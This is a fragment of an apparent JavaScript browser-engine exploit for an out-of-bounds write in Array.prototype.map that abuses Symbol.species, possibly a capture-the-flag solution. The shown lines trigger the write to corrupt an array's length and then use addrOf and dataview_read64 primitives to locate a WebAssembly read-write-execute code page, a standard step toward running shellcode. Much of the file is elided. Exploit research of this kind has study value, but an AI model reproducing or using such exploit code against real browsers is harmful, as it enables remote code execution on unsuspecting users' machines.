 ...
 * Author: raycp
 * 
 * Last Modified: 2019-12-17 07:43:23
 * Description: exp for array.prototype.map, a oob write vuln in map function, with abuse use of Symbol.species
************************************************************/
...
array[8] = 6;
// step 1 trigger the oob write to b[8], overwrite the oobArray's length
...
// step 8 get the wasm rwx code addr
var wasm_obj_addr = addrOf(func);
//var shared_info_addr = dataview_read64(wasm_obj_addr+0x20)-1;
//var code_addr = dataview_read64(shared_info_addr+8)-1;
var rwx_addr = dataview_read64(wasm_obj_addr+0x38); // code_addr+0x80; //-0xe0; //+ 0x80; //(dataview_read64(code_addr+0x72));
